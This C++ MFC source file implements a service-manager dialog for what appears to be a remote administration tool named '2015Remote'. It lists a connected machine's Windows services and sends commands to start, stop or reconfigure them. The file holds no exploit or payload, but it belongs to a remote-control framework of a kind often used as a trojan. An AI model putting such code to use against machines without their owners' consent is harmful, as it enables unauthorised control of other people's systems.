// ServicesDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "ServicesDlg.h"
#include "afxdialogex.h"


// CServicesDlg 对话框

IMPLEMENT_DYNAMIC(CServicesDlg, CDialog)

// ItemData1 不要和ItemData同名了，同名的话调试会有问题
typedef  struct  ItemData1
{
	CString Data[5];
	CString GetData(int index) const {
		return  this ? Data[index] : "";
	}
} ItemData1;

CServicesDlg::CServicesDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: DialogBase(CServicesDlg::IDD, pParent, IOCPServer, ContextObject, IDI_SERVICE)
{
}

CServicesDlg::~CServicesDlg()
{
}

void CServicesDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST, m_ControlList);
	DDX_Control(pDX, IDC_STATIC_COUNT, m_ServicesCount);
}


BEGIN_MESSAGE_MAP(CServicesDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_COMMAND(ID_SERVICES_AUTO, &CServicesDlg::OnServicesAuto)
	ON_COMMAND(ID_SERVICES_MANUAL, &CServicesDlg::OnServicesManual)
	ON_COMMAND(ID_SERVICES_STOP, &CServicesDlg::OnServicesStop)
	ON_COMMAND(ID_SERVICES_START, &CServicesDlg::OnServicesStart)
	ON_COMMAND(ID_SERVICES_REFLASH, &CServicesDlg::OnServicesReflash)
	ON_NOTIFY(NM_RCLICK, IDC_LIST, &CServicesDlg::OnNMRClickList)
	ON_NOTIFY(HDN_ITEMCLICK, 0, &CServicesDlg::OnHdnItemclickList)
END_MESSAGE_MAP()


// CServicesDlg 消息处理程序


BOOL CServicesDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon, TRUE);
	SetIcon(m_hIcon, FALSE);
	CString strString;
	strString.Format("%s - 服务管理",m_IPAddress);
	SetWindowText(strString);

	m_ControlList.SetExtendedStyle( LVS_EX_FULLROWSELECT);
	m_ControlList.InsertColumn(0, "真实名称", LVCFMT_LEFT, 150);
	m_ControlList.InsertColumn(1, "显示名称", LVCFMT_LEFT, 260);
	m_ControlList.InsertColumn(2, "启动类型", LVCFMT_LEFT, 80);
	m_ControlList.InsertColumn(3, "运行状态", LVCFMT_LEFT, 80);
	m_ControlList.InsertColumn(4, "可执行文件路径", LVCFMT_LEFT, 380);

	ShowServicesList();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

int CServicesDlg::ShowServicesList(void)
{
	Buffer tmp = m_ContextObject->InDeCompressedBuffer.GetMyBuffer(1);
	char	*szBuffer = tmp.c_str();
	char	*szDisplayName;
	char	*szServiceName;
	char	*szRunWay;
	char	*szAutoRun;
	char	*szFilePath;
	DWORD	dwOffset = 0;
	DeleteAllItems();

	int i = 0;
	for (i = 0; dwOffset < m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1; ++i)
	{
		szDisplayName = szBuffer + dwOffset;
		szServiceName = szDisplayName + lstrlen(szDisplayName) +1;
		szFilePath= szServiceName + lstrlen(szServiceName) +1;
		szRunWay = szFilePath + lstrlen(szFilePath) + 1;
		szAutoRun = szRunWay + lstrlen(szRunWay) + 1;

		m_ControlList.InsertItem(i, szServiceName);
		m_ControlList.SetItemText(i, 1, szDisplayName);
		m_ControlList.SetItemText(i, 2, szAutoRun);		
		m_ControlList.SetItemText(i, 3, szRunWay);
		m_ControlList.SetItemText(i, 4, szFilePath );
		auto data = new ItemData1{ szServiceName, szDisplayName, szAutoRun, szRunWay, szFilePath };
		m_ControlList.SetItemData(i, (DWORD_PTR)data);
		dwOffset += lstrlen(szDisplayName) + lstrlen(szServiceName) + lstrlen(szFilePath) + lstrlen(szRunWay)
			+ lstrlen(szAutoRun) +5;
	}

	CString strTemp;
	strTemp.Format("服务个数:%d",i);

	m_ServicesCount.SetWindowText(strTemp);

	return 0;
}

void CServicesDlg::OnClose()
{
	CancelIO();
	DeleteAllItems();

	DialogBase::OnClose();
}


void CServicesDlg::OnServicesAuto()
{
	ServicesConfig(3);
}


void CServicesDlg::OnServicesManual()
{
	ServicesConfig(4);
}


void CServicesDlg::OnServicesStop()
{
	ServicesConfig(2);
}


void CServicesDlg::OnServicesStart()
{
	ServicesConfig(1);
}


void CServicesDlg::OnServicesReflash()
{
	BYTE bToken = COMMAND_SERVICELIST;   //刷新
	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, 1);	
}

// 释放资源以后再清空
void  CServicesDlg::DeleteAllItems() {
	for (int i = 0; i < m_ControlList.GetItemCount(); i++)
	{
		auto data = (ItemData1*)m_ControlList.GetItemData(i);
		if (NULL != data) {
			delete data;
		}
	}
	m_ControlList.DeleteAllItems();
}

int CALLBACK CServicesDlg::CompareFunction(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort) {
	auto* pSortInfo = reinterpret_cast<std::pair<int, bool>*>(lParamSort);
	int nColumn = pSortInfo->first;
	bool bAscending = pSortInfo->second;

	// 获取列值
	ItemData1* context1 = (ItemData1*)lParam1;
	ItemData1* context2 = (ItemData1*)lParam2;
	CString s1 = context1->GetData(nColumn);
	CString s2 = context2->GetData(nColumn);

	int result = s1 > s2 ? 1 : -1;
	return bAscending ? result : -result;
}

void CServicesDlg::SortByColumn(int nColumn) {
	static int m_nSortColumn = 0;
	static bool m_bSortAscending = false;
	if (nColumn == m_nSortColumn) {
		// 如果点击的是同一列，切换排序顺序
		m_bSortAscending = !m_bSortAscending;
	}
	else {
		// 否则，切换到新列并设置为升序
		m_nSortColumn = nColumn;
		m_bSortAscending = true;
	}

	// 创建排序信息
	std::pair<int, bool> sortInfo(m_nSortColumn, m_bSortAscending);
	m_ControlList.SortItems(CompareFunction, reinterpret_cast<LPARAM>(&sortInfo));
}

void CServicesDlg::OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult) {
	LPNMHEADER pNMHeader = reinterpret_cast<LPNMHEADER>(pNMHDR);
	int nColumn = pNMHeader->iItem; // 获取点击的列索引
	SortByColumn(nColumn);          // 调用排序函数
	*pResult = 0;
}

void CServicesDlg::OnNMRClickList(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	
	CMenu Menu;
	Menu.LoadMenu(IDR_MENU_SERVICES);
	CMenu *SubMenu=Menu.GetSubMenu(0);
	CPoint	Point;
	GetCursorPos(&Point);
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN|TPM_LEFTBUTTON,Point.x,Point.y,this);
	*pResult = 0;
}


void CServicesDlg::OnReceiveComplete(void)
{
	switch (m_ContextObject->InDeCompressedBuffer.GetBYTE(0))
	{
	case TOKEN_SERVERLIST:
		ShowServicesList();
		break;
	default:
		// 传输发生异常数据
		break;
	}
}

void CServicesDlg::ServicesConfig(BYTE bCmd)
{
	DWORD	dwOffset = 2;
	POSITION Pos = m_ControlList.GetFirstSelectedItemPosition(); 
	int	iItem = m_ControlList.GetNextSelectedItem(Pos);

	CString strServicesName = m_ControlList.GetItemText(iItem, 0 );
	char*	szServiceName = strServicesName.GetBuffer(0);
	LPBYTE  szBuffer = (LPBYTE)LocalAlloc(LPTR, 3 + lstrlen(szServiceName));  //[][][]\0
	szBuffer[0] = COMMAND_SERVICECONFIG;
	szBuffer[1] = bCmd;


	memcpy(szBuffer + dwOffset, szServiceName, lstrlen(szServiceName)+1);

	m_iocpServer->OnClientPreSending(m_ContextObject, szBuffer, LocalSize(szBuffer));
	LocalFree(szBuffer);
}

void CServicesDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	if (!m_ControlList.GetSafeHwnd()) return; // 确保控件已创建

	// 计算新位置和大小
	CRect rc;
	m_ControlList.GetWindowRect(&rc);
	ScreenToClient(&rc);

	// 重新设置控件大小
	m_ControlList.MoveWindow(0, 0, cx, cy, TRUE);
}
